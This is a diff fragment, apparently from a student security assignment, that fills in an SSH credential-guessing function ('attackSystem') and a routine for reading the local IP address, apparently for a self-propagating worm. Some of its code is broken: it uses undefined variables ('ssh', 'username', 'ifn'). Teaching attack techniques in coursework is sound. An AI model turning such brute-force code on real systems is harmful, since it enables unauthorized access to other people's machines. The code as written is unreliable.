@@ -150,8 +150,13 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-		pass	
+		attemptResults=tryCredentials(host, userName, password, sshClient)
+		if(attemptResults != 0):
+			pass
 			
+		else:
+			return(ssh,username,password)
+		
 	# Could not find working credentials
 	return None	
 
@@ -162,10 +167,15 @@ def attackSystem(host):
 # @return - The UP address of the current system
 ####################################################
 def getMyIP(interface):
+	#Sample Code from professor getip
+
+	sck = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	
-	# TODO: Change this to retrieve and
-	# return the IP of the current system.
-	return None
+	# Grab the IP address of the current 
+	# interface from the kernel. Convert
+	# the original format to string format.
+	return socket.inet_ntoa(fcntl.ioctl(sck.fileno(),0x8915,struct.pack(b'256s', ifn[:15]))[20:24])
+
 
 #######################################################
 # Returns the list of systems on the same network
